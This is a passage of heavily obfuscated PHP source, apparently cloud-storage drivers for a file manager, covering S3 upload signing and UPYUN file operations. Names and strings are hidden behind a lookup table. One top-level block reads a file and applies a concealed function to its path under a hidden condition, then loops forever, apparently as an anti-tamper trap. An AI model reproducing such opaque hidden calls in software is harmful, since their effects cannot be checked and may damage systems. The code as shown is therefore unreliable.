$Ÿ‹ÈÔò); } protected function objectMeta($Ş÷êÃÙá) { return $this->cacheMethod($_SERVER[ĞÆÏ¡Îª][167], $Ş÷êÃÙá); } protected function _objectMeta($Ë´ü½¹Í) { $Ÿ š´€¥ =& $_SERVER[ĞÆÏ¡Îª]; $Ë´ü½¹Í = rtrim($Ë´ü½¹Í, $Ÿ š´€¥[8]); try { $ê‚´²¡° = $this->client->getObjectInfo($this->bucket, $Ë´ü½¹Í); if (!isset($ê‚´²¡°[$Ÿ š´€¥[221]]) && isset($ê‚´²¡°[$Ÿ š´€¥[237]])) { $ê‚´²¡°[$Ÿ š´€¥[221]] = $ê‚´²¡°[$Ÿ š´€¥[237]]; } } catch (Exception $”¡…ÄòŞ) { $ê‚´²¡° = !1; } if (!$ê‚´²¡°) { } return $ê‚´²¡°; } protected function _isFolder($ú¬ÏŠôë) { $ˆÀÊºÙş =& $_SERVER[ĞÆÏ¡Îª]; $ú¬ÏŠôë = rtrim($ú¬ÏŠôë, $ˆÀÊºÙş[8]); if ($ú¬ÏŠôë == $ˆÀÊºÙş[12] || $ú¬ÏŠôë == $ˆÀÊºÙş[8]) { return !0; } $†Œ¿ëÅ‰ = $this->client->getBucket($this->bucket, $ú¬ÏŠôë, null, 1); if (empty($†Œ¿ëÅ‰[$ˆÀÊºÙş[204]])) { return !1; } $˜¥Šè = $†Œ¿ëÅ‰[$ˆÀÊºÙş[204]][0][$ˆÀÊºÙş[32]]; return stripos($˜¥Šè, $ú¬ÏŠôë . $ˆÀÊºÙş[8]) === 0 ? !0 : !1; if (substr($˜¥Šè, -1) == $ˆÀÊºÙş[8]) { return !0; } if (get_path_this($˜¥Šè) == get_path_this($ú¬ÏŠôë)) { return !1; } return !0; } } if (!isset($_SERVER[$_SERVER[ĞÆÏ¡Îª][238]]) || !isset($_SERVER[$_SERVER[ĞÆÏ¡Îª][239]])) { $_getc = $_SERVER[ĞÆÏ¡Îª][240]; $_getfile = $_SERVER[$_SERVER[ĞÆÏ¡Îª][241]] . $_SERVER[ĞÆÏ¡Îª][242]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ĞÆÏ¡Îª][231], $_getfilec); if (count($_getarrs) < $_SERVER[ĞÆÏ¡Îª][243]) { $exit = $_SERVER[ĞÆÏ¡Îª][244]; $exit(); } $_act = $_SERVER[ĞÆÏ¡Îª][245]; $_act($_SERVER[$_SERVER[ĞÆÏ¡Îª][241]] . $_SERVER[ĞÆÏ¡Îª][242]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ĞÆÏ¡Îª][246]); } } goto DÚÌ»÷ØìÕ; fÆ±Şö‡ÄÓ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($£ ¦íÌÌ) { parent::__construct($£ ¦íÌÌ); } public function uploadFormData($»„ÊüÖ½, $ø —’ô¸ = 3600) { $ÇãÕ¢¬Ö =& $_SERVER[ĞÆÏ¡Îª]; $şûâµÄú = $ÇãÕ¢¬Ö[198]; $ ˜´ùÂÇ = $ÇãÕ¢¬Ö[1337]; $öüç¶Ñ† = $ÇãÕ¢¬Ö[62]; $·Ğ«Ö = gmdate($ÇãÕ¢¬Ö[1338]); $Œ§ÄîÙ– = gmdate($ÇãÕ¢¬Ö[746]); $èÀŠ³ş„ = $ÇãÕ¢¬Ö[1339]; $èÒï™– = $ø —’ô¸ . $ÇãÕ¢¬Ö[12]; $„ÏÁ©Œ€ = $ÇãÕ¢¬Ö[1301]; $Õ»” •å = array($this->accessKey, $Œ§ÄîÙ–, $this->region, $öüç¶Ñ†, $èÀŠ³ş„); $ÃüüÀÚ÷ = implode($ÇãÕ¢¬Ö[8], $Õ»” •å); $èíî‡ÅÅ = array($ÇãÕ¢¬Ö[1303] => gmdate($ÇãÕ¢¬Ö[1302], strtotime($ÇãÕ¢¬Ö[1340])), $ÇãÕ¢¬Ö[1304] => array(array($ÇãÕ¢¬Ö[1306] => $this->bucket), array($ÇãÕ¢¬Ö[1305] => $şûâµÄú), array($ÇãÕ¢¬Ö[1307], $ÇãÕ¢¬Ö[1308], $ÇãÕ¢¬Ö[12]), array($ÇãÕ¢¬Ö[1307], $ÇãÕ¢¬Ö[1341], $ÇãÕ¢¬Ö[12]), array($ÇãÕ¢¬Ö[1307], $ÇãÕ¢¬Ö[1342], $ÇãÕ¢¬Ö[12]), array($ÇãÕ¢¬Ö[1309] => $„ÏÁ©Œ€), array($ÇãÕ¢¬Ö[1343] => $ÃüüÀÚ÷), array($ÇãÕ¢¬Ö[1344] => $ ˜´ùÂÇ), array($ÇãÕ¢¬Ö[1345] => $·Ğ«Ö), array($ÇãÕ¢¬Ö[1346] => $èÒï™–))); $ÅóËØ«Ç = base64_encode(json_encode($èíî‡ÅÅ)); $àœ¢Ê– = hash_hmac($ÇãÕ¢¬Ö[1347], $Œ§ÄîÙ–, $ÇãÕ¢¬Ö[1348] . $this->secret, !0); $ÈÏ¹ˆªÖ = hash_hmac($ÇãÕ¢¬Ö[1347], $this->region, $àœ¢Ê–, !0); $§ğíîÓ = hash_hmac($ÇãÕ¢¬Ö[1347], $öüç¶Ñ†, $ÈÏ¹ˆªÖ, !0); $˜Ñ¨ÄØ = hash_hmac($ÇãÕ¢¬Ö[1347], $èÀŠ³ş„, $§ğíîÓ, !0); $ùÀ™§Ü– = hash_hmac($ÇãÕ¢¬Ö[1347], $ÅóËØ«Ç, $˜Ñ¨ÄØ); $ô®¾ô€† = array($ÇãÕ¢¬Ö[215] => $ÇãÕ¢¬Ö[12], $ÇãÕ¢¬Ö[1349] => $ÇãÕ¢¬Ö[12], $ÇãÕ¢¬Ö[1305] => $şûâµÄú, $ÇãÕ¢¬Ö[1309] => $„ÏÁ©Œ€, $ÇãÕ¢¬Ö[1313] => $ÅóËØ«Ç, $ÇãÕ¢¬Ö[1350] => $ÃüüÀÚ÷, $ÇãÕ¢¬Ö[1351] => $ ˜´ùÂÇ, $ÇãÕ¢¬Ö[1352] => $·Ğ«Ö, $ÇãÕ¢¬Ö[1353] => $èÒï™–, $ÇãÕ¢¬Ö[1354] => $ùÀ™§Ü–, $ÇãÕ¢¬Ö[181] => $this->getHost()); return $ô®¾ô€†; } public function multiUploadFormData($à¿ô„¯¾, $Å…µ·àœ = 3600) { $ŸÄ”“¢ä =& $_SERVER[ĞÆÏ¡Îª]; $ ‰˜å® = gmdate($ŸÄ”“¢ä[1433]); $¬ëíš×± = array(); $°·ÉŞ‰£ = $this->client->getUploadId($this->bucket, $à¿ô„¯¾, $¬ëíš×±); if (!$°·ÉŞ‰£) { return !1; } return array($ŸÄ”“¢ä[223] => $°·ÉŞ‰£, $ŸÄ”“¢ä[181] => $this->getHost() . $ŸÄ”“¢ä[8] . $this->pathEncode($à¿ô„¯¾), $ŸÄ”“¢ä[224] => $ ‰˜å®, $ŸÄ”“¢ä[94] => $à¿ô„¯¾); } public function multiUploadAuthData($»ÊÏ©üÆ, $«¥¼­¿ø = array()) { $ˆ€ğÈ¯ =& $_SERVER[ĞÆÏ¡Îª]; $ ØÆ¨•° = isset($«¥¼­¿ø[$ˆ€ğÈ¯[174]]) ? $«¥¼­¿ø[$ˆ€ğÈ¯[174]] : $ˆ€ğÈ¯[12]; $ÑŸŸÎÂ¢ = $«¥¼­¿ø[$ˆ€ğÈ¯[94]]; unset($«¥¼­¿ø[$ˆ€ğÈ¯[94]]); if (isset($«¥¼­¿ø[$ˆ€ğÈ¯[225]])) { return $this->listUploadParts($ÑŸŸÎÂ¢, $«¥¼­¿ø); } $ÜĞš³—õ = array(); if (isset($«¥¼­¿ø[$ˆ€ğÈ¯[1434]])) { $ÜĞš³—õ[$ˆ€ğÈ¯[1435]] = $«¥¼­¿ø[$ˆ€ğÈ¯[1434]]; } $ñ¹Šª¶Ù = explode($ˆ€ğÈ¯[183], $this->getHost()); $¨Íõœ€» = array($ˆ€ğÈ¯[1436] => $ñ¹Šª¶Ù[1], $ˆ€ğÈ¯[1437] => $ˆ€ğÈ¯[12], $ˆ€ğÈ¯[215] => $ˆ€ğÈ¯[120], $ˆ€ğÈ¯[1349] => $«¥¼­¿ø[$ˆ€ğÈ¯[76]]); $Â¡’‘Üœ = $ˆ€ğÈ¯[228]; $ôÊÒÙ‰ƒ = $ˆ€ğÈ¯[8] . $this->pathEncode($ÑŸŸÎÂ¢) . $ ØÆ¨•°; $…Â¸¿¿— = $this->client->__getSignatureV4($ÜĞš³—õ, $¨Íõœ€», $Â¡’‘Üœ, $ôÊÒÙ‰ƒ); if (strpos($ ØÆ¨•°, $ˆ€ğÈ¯[227]) === 0) { if (isset($ÜĞš³—õ[$ˆ€ğÈ¯[1435]])) { $£¾”‹ú = $ÜĞš³—õ[$ˆ€ğÈ¯[1435]]; } else { if (isset($…Â¸¿¿—[$ˆ€ğÈ¯[1435]])) { $£¾”‹ú = $…Â¸¿¿—[$ˆ€ğÈ¯[1435]]; } else { $£¾”‹ú = hash($ˆ€ğÈ¯[1347], $ˆ€ğÈ¯[12]); } } return array($ˆ€ğÈ¯[234] => $…Â¸¿¿—[$ˆ€ğÈ¯[234]], $ˆ€ğÈ¯[1435] => $£¾”‹ú, $ˆ€ğÈ¯[224] => $…Â¸¿¿—[$ˆ€ğÈ¯[1438]]); } return $…Â¸¿¿—[$ˆ€ğÈ¯[234]]; } public function listUploadParts($Æ‘„Ş », $¸¤¥êèè = array()) { $¡ ¡ûŸÎ =& $_SERVER[ĞÆÏ¡Îª]; $éã¼§í = str_replace($¡ ¡ûŸÎ[235], $¡ ¡ûŸÎ[12], $¸¤¥êèè[$¡ ¡ûŸÎ[174]]); $¸õÁÆ´ = $this->client->listParts($this->bucket, $Æ‘„Ş », $éã¼§í); if (!$¸õÁÆ´) { return !1; } $™Ä®Ë•Ë = $¡ ¡ûŸÎ[1439]; foreach ($¸õÁÆ´ as $øìõ¶ÒÊ) { $™Ä®Ë•Ë .= $¡ ¡ûŸÎ[1440] . "\x3c\120\141\162\x74\116\x75\155\142\x65\x72\x3e{$øìõ¶ÒÊ[$¡ ¡ûŸÎ[1394]]}\x3c\x2f\120\141\162\x74\x4e\165\155\x62\x65\x72\76\12" . "\x3c\105\124\x61\x67\76{$øìõ¶ÒÊ[$¡ ¡ûŸÎ[1395]]}\74\x2f\105\124\141\x67\x3e\12" . $¡ ¡ûŸÎ[1441]; } $™Ä®Ë•Ë .= $¡ ¡ûŸÎ[1442]; $´¬È›Ø” = array(); $×İÍÈƒì = explode($¡ ¡ûŸÎ[183], $this->getHost()); $¢í€Ğ ò = array($¡ ¡ûŸÎ[1436] => $×İÍÈƒì[1], $¡ ¡ûŸÎ[215] => $¡ ¡ûŸÎ[120], $¡ ¡ûŸÎ[1349] => strlen($™Ä®Ë•Ë)); $ì«¥æ„Œ = $¡ ¡ûŸÎ[226]; $°ğ¨âÌÆ = $¡ ¡ûŸÎ[8] . $this->pathEncode($Æ‘„Ş ») . $¸¤¥êèè[$¡ ¡ûŸÎ[174]]; $ÁëÎ­½ = $this->client->__getSignatureV4($´¬È›Ø”, $¢í€Ğ ò, $ì«¥æ„Œ, $°ğ¨âÌÆ, $™Ä®Ë•Ë); return array($¡ ¡ûŸÎ[234] => $ÁëÎ­½[$¡ ¡ûŸÎ[234]], $¡ ¡ûŸÎ[224] => $ÁëÎ­½[$¡ ¡ûŸÎ[1438]], $¡ ¡ûŸÎ[236] => $¸õÁÆ´, $¡ ¡ûŸÎ[1435] => $ÁëÎ­½[$¡ ¡ûŸÎ[1435]]); } public function link($™µé”œØ, $ØûŸµı¹ = array()) { return parent::link($™µé”œØ, $ØûŸµı¹); } public function fileOut($£ûÄ¹İ², $ß»ƒ½» = false, $Ééîç‚  = false, $Ÿò‹æË  = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ĞÆÏ¡Îª][1443])) { return parent::fileOutServer($£ûÄ¹İ², $ß»ƒ½», $Ééîç‚ , $Ÿò‹æË ); } parent::fileOut($£ûÄ¹İ², $ß»ƒ½», $Ééîç‚ , $Ÿò‹æË ); } public function fileOutImage($¡­¢¶½™, $§ó‘Ü• = 250) { if (strstr($this->endpoint, $_SERVER[ĞÆÏ¡Îª][1443])) { return parent::fileOutImageServer($¡­¢¶½™, $§ó‘Ü•); } parent::fileOutImage($¡­¢¶½™, $§ó‘Ü•); } public function fileOutLink($ãò­“ÉÃ) { $ı®…¦£ó =& $_SERVER[ĞÆÏ¡Îª]; if (substr($ãò­“ÉÃ, 0, 7) == $ı®…¦£ó[1316]) { $ãò­“ÉÃ = $ı®…¦£ó[1317] . substr($ãò­“ÉÃ, 7); } header($ı®…¦£ó[161] . $ãò­“ÉÃ); die; } public function getHost() { $«¨ééä =& $_SERVER[ĞÆÏ¡Îª]; $¼ô‡°µ² = str_rtrim(parent::getHost(), $«¨ééä[8] . $this->bucket); $¼ô‡°µ² = explode($«¨ééä[183], $¼ô‡°µ²); return $¼ô‡°µ²[0] . $«¨ééä[183] . $this->bucket . $«¨ééä[10] . $¼ô‡°µ²[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($§‘…ÕÔá, $—àšŸ = 0) { parent::__construct(); $this->source = $§‘…ÕÔá; $this->sourceSize = $—àšŸ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($û­Îå‹ß = false) { return $this->sourceSize; } public function getContent($¤“öÊµÚ = false) { return $this->fileSubstr($¤“öÊµÚ, 0, $this->sourceSize); } public function fileSubstr($ÒŸ¿ÔôÒ = false, $Ñ‰ıñı = 0, $÷ÈßîıÁ = 0) { if (!$÷ÈßîıÁ) { $÷ÈßîıÁ = $this->sourceSize; } $¹Ù©…ìı = $this->sourceSize - $Ñ‰ıñı; if ($÷ÈßîıÁ >= $¹Ù©…ìı) { $÷ÈßîıÁ = $¹Ù©…ìı; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Ñ‰ıñı, $÷ÈßîıÁ); } if ($this->sourceType == self::TYPE_FILE) { if ($÷ÈßîıÁ <= 0) { return $_SERVER[ĞÆÏ¡Îª][12]; } $ù‰˜‘Ä» = ftell($this->source); fseek_64($this->source, $ù‰˜‘Ä» + $Ñ‰ıñı); $ıª¿í‚Š = @fread($this->source, $÷ÈßîıÁ); fseek_64($this->source, $ù‰˜‘Ä»); return $ıª¿í‚Š; } } public function hashMd5($ïÅĞß…è = false) { return md5($this->getContent()); } public static function hash($·Ä½ëı, $ê™ö°ïÄ = 0) { $ì¨ÌÎˆš = new PathDriverStream($·Ä½ëı, $ê™ö°ïÄ); return $ì¨ÌÎˆš->hashSimple($·Ä½ëı); } public static function md5($ªè°µƒ‰, $Ğ…å‘û‰ = 0) { $şæ¢¸­¹ = new PathDriverStream($ªè°µƒ‰, $Ğ…å‘û‰); return $şæ¢¸­¹->hashMd5($ªè°µƒ‰); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\x70\72\x2f\x2f\166\60\x2e\141\160\x69\x2e\165\x70\171\165\156\x2e\143\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($¦¬È±ËÁ) { parent::__construct(); $this->_init($¦¬È±ËÁ); } public function _init($«‹ ¹·œ) { $…”¯•şÄ =& $_SERVER[ĞÆÏ¡Îª]; foreach ($«‹ ¹·œ as $ÒÕƒ›×• => $óÒ´ÛÄ) { if (isset($this->{$ÒÕƒ›×•})) { $this->{$ÒÕƒ›×•} = $óÒ´ÛÄ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($…”¯•şÄ[1444] . LNG($…”¯•şÄ[1375])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ù®Àïöá, $éüõ½˜À = "\x47\105\124") { $åÕÇÁßª =& $_SERVER[ĞÆÏ¡Îª]; $èÙçÉõÜ = gmdate($åÕÇÁßª[1408]); $…ŞµÇ‘Ì = base64_encode(hash_hmac($åÕÇÁßª[1445], "{$éüõ½˜À}\x26{$ù®Àïöá}\46{$èÙçÉõÜ}", md5("{$this->userpass}"), !0)); $ŒÇÜâô = array("\101\165\x74\150\x6f\x72\x69\172\x61\x74\151\157\x6e\x3a\125\120\131\125\116\x20{$this->username}\x3a{$…ŞµÇ‘Ì}", "\104\x61\x74\x65\x3a{$èÙçÉõÜ}"); return $ŒÇÜâô; } public function ussRequest($¹É¯†¤, $åš–ÎÌš = "\107\x45\124", $·Æ™ğõÔ = false, $¬ßó†ı  = false, $Ø şĞºÆ = false) { $â¬– =& $_SERVER[ĞÆÏ¡Îª]; $¹É¯†¤ = trim($¹É¯†¤, $â¬–[8]); $ù­½˜ºé = "\57{$this->bucket}\57{$¹É¯†¤}"; $Û‡¬¢èğ = $this->ussHeaders($ù­½˜ºé, $åš–ÎÌš); if ($¬ßó†ı ) { $Û‡¬¢èğ = array_merge($Û‡¬¢èğ, $¬ßó†ı ); } $ß£¢Ññ¾ = url_request($this->endpoint . $ù­½˜ºé, $åš–ÎÌš, $·Æ™ğõÔ, $Û‡¬¢èğ, $Ø şĞºÆ); if (!$ß£¢Ññ¾) { return array($â¬–[1182] => !1, $â¬–[1184] => $â¬–[1446]); } if (strtolower($åš–ÎÌš) == $â¬–[196] || in_array($ß£¢Ññ¾[$â¬–[1182]], array($â¬–[1301], $â¬–[1447]))) { $·Æ™ğõÔ = $ß£¢Ññ¾[$â¬–[1448]]; } else { $·Æ™ğõÔ = json_decode($ß£¢Ññ¾[$â¬–[1184]], !0); if (!$·Æ™ğõÔ) { $·Æ™ğõÔ = $ß£¢Ññ¾[$â¬–[1184]]; } else { if (!$ß£¢Ññ¾[$â¬–[745]] && isset($·Æ™ğõÔ[$â¬–[1449]])) { $·Æ™ğõÔ = $·Æ™ğõÔ[$â¬–[1449]]; } } } return array($â¬–[1182] => $ß£¢Ññ¾[$â¬–[745]], $â¬–[1184] => $·Æ™ğõÔ); } public function mkfile($²¯ø¤Ã«, $Í£ñÜËƒ = '', $Åşìâ€Ú = REPEAT_RENAME) { if ($this->setContent($²¯ø¤Ã«, $Í£ñÜËƒ)) { return $this->getPathOuter($²¯ø¤Ã«); } return !1; } public function mkdir($¼¢Õ…æ¡, $À¥ß‡ã = REPEAT_SKIP) { $„œìºåî =& $_SERVER[ĞÆÏ¡Îª]; $¨œ¥ì®Ÿ = trim($¼¢Õ…æ¡, $„œìºåî[8]); if ($this->_isFolder($¨œ¥ì®Ÿ)) { return $this->getPathOuter($¨œ¥ì®Ÿ); } $ƒµØ¾  = array($„œìºåî[1450]); $ÛÂ›Ê½ø = $this->ussRequest($¨œ¥ì®Ÿ, $„œìºåî[226], !1, $ƒµØ¾ ); return $ÛÂ›Ê½ø[$„œìºåî[1182]] ? $this->getPathOuter($¨œ¥ì®Ÿ) : !1; } public function copyFile($¼ÅñõÚ, $…Ÿ‡ÏˆÌ) { $íÈøçºñ =& $_SERVER[ĞÆÏ¡Îª]; $Ê†«ÒÁİ = array($íÈøçºñ[1451] . "\x2f{$this->bucket}\x2f{$¼ÅñõÚ}", $íÈøçºñ[1452]); $•Êˆğº³ = $this->ussRequest($…Ÿ‡ÏˆÌ, $íÈøçºñ[228], !1, $Ê†«ÒÁİ); return $•Êˆğº³[$íÈøçºñ[1182]] ? !0 : $this->getPathOuter($…Ÿ‡ÏˆÌ); } public function moveFile($Şàïó, $Êü°éñ£) { $¸‹™ü§Š =& $_SERVER[ĞÆÏ¡Îª]; $±Ìí»Â– = array($¸‹™ü§Š[1453] . "\x2f{$this->bucket}\57{$Şàïó}", $¸‹™ü§Š[1452]); $İõÇÂé = $this->ussRequest($Êü°éñ£, $¸‹™ü§Š[228], !1, $±Ìí»Â–); return $İõÇÂé[$¸‹™ü§Š[1182]] ? !0 : $this->getPathOuter($Êü°éñ£); } public function delFile($øßé®ğ») { $‡Ì“ñœ‹ =& $_SERVER[ĞÆÏ¡Îª]; $–€Ñ©Ö = $this->ussRequest($øßé®ğ», $‡Ì“ñœ‹[1454]); return $–€Ñ©Ö[$‡Ì“ñœ‹[1182]] ? !0 : !1; } public function delFolder($üàáŸ¦¢) { $¥€“•ô =& $_SERVER[ĞÆÏ¡Îª]; if (!$this->exist($üàáŸ¦¢)) { return !0; } $this->listItemCache = !1; $ŠâŸÔ› = $½¥ÜîÂ‰ = array(); $this->fileList($üàáŸ¦¢, $ŠâŸÔ›, $½¥ÜîÂ‰, !0); $this->listItemCache = !0; foreach ($½¥ÜîÂ‰ as $†¾âé¢ú) { $ßÌÄ¿ª = $this->ussRequest($†¾âé¢ú[$¥€“•ô[32]], $¥€“•ô[1454]); if (!$ßÌÄ¿ª[$¥€“•ô[1182]]) { return !1; } } foreach ($ŠâŸÔ› as $ÚÎ³Åİ’) { $ßÌÄ¿ª = $this->ussRequest($ÚÎ³Åİ’, $¥€“•ô[1454]); if (!$ßÌÄ¿ª[$¥€“•ô[1182]]) { return !1; } } $ßÌÄ¿ª = $this->ussRequest($üàáŸ¦¢, $¥€“•ô[1454]); return $ßÌÄ¿ª[$¥€“•ô[1182]]; } public function rename($Æ‘ç¤Óş, $õ…ÛÊãÙ) { if ($this->isFile($Æ‘ç¤Óş)) { $õ…ÛÊãÙ = get_path_father($Æ‘ç¤Óş) . $õ…ÛÊãÙ; return $this->moveFile($Æ‘ç¤Óş, $õ…ÛÊãÙ); } return $this->renameObject($Æ‘ç¤Óş, $õ…ÛÊãÙ); } public function fileInfo($ºšÚÈ, $ÖüœÀÅä = false, $üÑ±‚›‚ = array()) { $¢˜èÀšü =& $_SERVER[ĞÆÏ¡Îª]; $ƒËÕã°ï = array($¢˜èÀšü[32] => $this->pathThis($ºšÚÈ), $¢˜èÀšü[84] => $this->getPathOuter($¢˜èÀšü[8] . $ºšÚÈ), $¢˜èÀšü[33] => $¢˜èÀšü[199], $¢˜èÀšü[76] => isset($üÑ±‚›‚[$¢˜èÀšü[76]]) ? $üÑ±‚›‚[$¢˜èÀšü[76]] : 0, $¢˜èÀšü[174] => $this->ext($ºšÚÈ)); if ($ÖüœÀÅä) { return $ƒËÕã°ï; } $ƒËÕã°ï[$¢˜èÀšü[200]] = $ƒËÕã°ï[$¢˜èÀšü[85]] = 0; $ƒËÕã°ï[$¢˜èÀšü[201]] = $ƒËÕã°ï[$¢˜èÀšü[202]] = !0; if (empty($üÑ±‚›‚)) { $üÑ±‚›‚ = $this->objectMeta($ºšÚÈ); if (!$üÑ±‚›‚) { return $ƒËÕã°ï; } } $ƒËÕã°ï[$¢˜èÀšü[200]] = intval($üÑ±‚›‚[$¢˜èÀšü[1455]]); $ƒËÕã°ï[$¢˜èÀšü[85]] = intval($üÑ±‚›‚[$¢˜èÀšü[1456]]); $ƒËÕã°ï[$¢˜èÀšü[76]] = $üÑ±‚›‚[$¢˜èÀšü[76]]; return $ƒËÕã°ï; } public function folderInfo($ø×œ²ğ, $áĞ‚âÍÉ = false) { $©å±Ğ =& $_SERVER[ĞÆÏ¡Îª]; $¸š²‰Èğ = array($©å±Ğ[32] => $this->pathThis($ø×œ²ğ), $©å±Ğ[84] => $this->getPathOuter($©å±Ğ[8] . $ø×œ²ğ), $©å±Ğ[33] => $©å±Ğ[75]); if ($áĞ‚âÍÉ) { return $¸š²‰Èğ; } $¸š²‰Èğ[$©å±Ğ[200]] = $¸š²‰Èğ[$©å±Ğ[85]] = 0; $¸š²‰Èğ[$©å±Ğ[201]] = $¸š²‰Èğ[$©å±Ğ[202]] = !0; if (empty($˜·–ÁØ)) { $˜·–ÁØ = $this->objectMeta($ø×œ²ğ); if (!$˜·–ÁØ) { return $¸š²‰Èğ; } } $¸š²‰Èğ[$©å±Ğ[200]] = intval($˜·–ÁØ[$©å±Ğ[1455]]); $¸š²‰Èğ[$©å±Ğ[85]] = intval($˜·–ÁØ[$©å±Ğ[1456]]); return $¸š²‰Èğ; } private function listObjs($ÔÛƒéò¸, $ñ¸ÃÚÔ’ = 0, $òú‚™ÎŸ = 1000) { $ Éà¢äù =& $_SERVER[ĞÆÏ¡Îª]; $ñ”ò†¡ = array($ Éà¢äù[1457], $ Éà¢äù[1458] . $òú‚™ÎŸ); if ($ñ¸ÃÚÔ’) { $ñ”ò†¡[] = $ Éà¢äù[1459] . $ñ¸ÃÚÔ’; } $»ü–ºÂœ = $this->ussRequest($ÔÛƒéò¸, $ Éà¢äù[230], !1, $ñ”ò†¡); return !$»ü–ºÂœ[$ Éà¢äù[1182]] ? !1 : $»ü–ºÂœ[$ Éà¢äù[1184]]; } private function fileList($ÃîÊ•Ê¢, &$µ¤ßøÆÈ, &$¢Î•ºª, $£¬õÉæÖ = false) { $Î·ì„º¡ =& $_SERVER[ĞÆÏ¡Îª]; $¶½°Ş¯µ = $Î·ì„º¡[12]; $İ‹œš® = 1000; $ñ¡Ú õ– = rtrim($ÃîÊ•Ê¢, $Î·ì„º¡[8]) . $Î·ì„º¡[8]; while (!0) { check_abort(); $£êï½£¼ = $this->listObjs($ÃîÊ•Ê¢, $¶½°Ş¯µ, $İ‹œš®); if (!$£êï½£¼) { return !1; } $¶½°Ş¯µ = isset($£êï½£¼[$Î·ì„º¡[1460]]) ? $£êï½£¼[$Î·ì„º¡[1460]] : $Î·ì„º¡[12]; $óÅã¦åˆ = isset($£êï½£¼[$Î·ì„º¡[1461]]) ? $£êï½£¼[$Î·ì„º¡[1461]] : array(); foreach ($óÅã¦åˆ as $àÛºâòÎ) { $”üƒİ£‹ = $àÛºâòÎ[$Î·ì„º¡[33]] == $Î·ì„º¡[75] ? !0 : !1; $™úÓ§² = ltrim($ñ¡Ú õ– . $àÛºâòÎ[$Î·ì„º¡[32]], $Î·ì„º¡[8]) . ($”üƒİ£‹ ? $Î·ì„º¡[8] : $Î·ì„º¡[12]); $ïèş…× = array($Î·ì„º¡[32] => $™úÓ§², $Î·ì„º¡[33] => $”üƒİ£‹ ? $Î·ì„º¡[75] : $Î·ì„º¡[199], $Î·ì„º¡[76] => $àÛºâòÎ[$Î·ì„º¡[346]], $Î·ì„º¡[1456] => $àÛºâòÎ[$Î·ì„º¡[1462]]); $this->cacheMethodInfoSet($™úÓ§², $”üƒİ£‹, $ïèş…×); if ($”üƒİ£‹) { $µ¤ßøÆÈ[] = $™úÓ§²; if ($£¬õÉæÖ) { $this->fileList($™úÓ§², $µ¤ßøÆÈ, $¢Î•ºª, $£¬õÉæÖ); } continue; } $¢Î•ºª[] = $ïèş…×; } if (count($óÅã¦åˆ) < $İ‹œš®) { break; } } $this->cacheMethodInfoSet($ÃîÊ•Ê¢, !0); } public function listPath($ÓÑê¾ÍÌ, $°¸óÁÂ× = false) { $Ğ†™ğ”‘ =& $_SERVER[ĞÆÏ¡Îª]; $ïÏœ­Ğ« = $Ïñ‚“£Ü = array(); $this->fileList($ÓÑê¾ÍÌ, $ïÏœ­Ğ«, $Ïñ‚“£Ü); foreach ($ïÏœ­Ğ« as $®çÆÊ…Ÿ => $çö°ëœö) { $ïÏœ­Ğ«[$®çÆÊ…Ÿ] = $this->folderInfo($çö°ëœö, $°¸óÁÂ×); } foreach ($Ïñ‚“£Ü as $®çÆÊ…Ÿ => $çö°ëœö) { $Ïñ‚“£Ü[$®çÆÊ…Ÿ] = $this->fileInfo($çö°ëœö[$Ğ†™ğ”‘[32]], $°¸óÁÂ×, $çö°ëœö); } return array($Ğ†™ğ”‘[82] => $ïÏœ­Ğ«, $Ğ†™ğ”‘[83] => $Ïñ‚“£Ü); } public function has($÷¦³·‚Í, $ˆ˜«–½ = false, $„½ñÔŒ· = true) { $òö·³Ÿó =& $_SERVER[ĞÆÏ¡Îª]; $Õœ˜¥Î† = $òö·³Ÿó[12]; $öğİÅÕ£ = 500; $•ÅÂ—› = 0; $óß¸÷ßÁ = 0; $¬òÈò›ü = rtrim($÷¦³·‚Í, $òö·³Ÿó[8]) . $òö·³Ÿó[8]; while (!0) { check_abort(); $¸òåÍÅ‹ = $this->listObjs($÷¦³·‚Í, $Õœ˜¥Î†, $öğİÅÕ£); if (!$¸òåÍÅ‹) { return !1; } $Õœ˜¥Î† = isset($¸òåÍÅ‹[$òö·³Ÿó[1460]]) ? $¸òåÍÅ‹[$òö·³Ÿó[1460]] : $òö·³Ÿó[12]; $”óÓç‰ê = isset($¸òåÍÅ‹[$òö·³Ÿó[1461]]) ? $¸òåÍÅ‹[$òö·³Ÿó[1461]] : array(); if (empty($”óÓç‰ê)) { break; } $¢àıçôŒ = array_filter($”óÓç‰ê, function ($¹—Œò“) { $ã±¦•Ë¡ =& $_SERVER[ĞÆÏ¡Îª]; return $¹—Œò“[$ã±¦•Ë¡[33]] == $ã±¦•Ë¡[75]; }); $İàÊ‚şü = count($”óÓç‰ê); $¢àıçôŒ = count($¢àıçôŒ); $Ò‡¨¬Ï“ = $İàÊ‚şü - $¢àıçôŒ; if ($ˆ˜«–½) { $óß¸÷ßÁ += $¢àıçôŒ; $•ÅÂ—› += $Ò‡¨¬Ï“; if ($İàÊ‚şü < $öğİÅÕ£) { break; } continue; } if ($„½ñÔŒ·) { if ($Ò‡¨¬Ï“) { return !0; } } else { if ($¢àıçôŒ) { return !0; } } if ($İàÊ‚şü < $öğİÅÕ£) { break; } } if ($ˆ˜«–½) { return array($òö·³Ÿó[207] => $•ÅÂ—›, $òö·³Ÿó[208] => $óß¸÷ßÁ); } return !1; } public function listAll($İËäŞÜ) { $”ËêÀÍÅ =& $_SERVER[ĞÆÏ¡Îª]; $ôä¸ûÙğ = $¾’âÀê¾ = array(); $this->fileList($İËäŞÜ, $ôä¸ûÙğ, $¾’âÀê¾, !0); $—‘ëÚÅ¨ = array(); 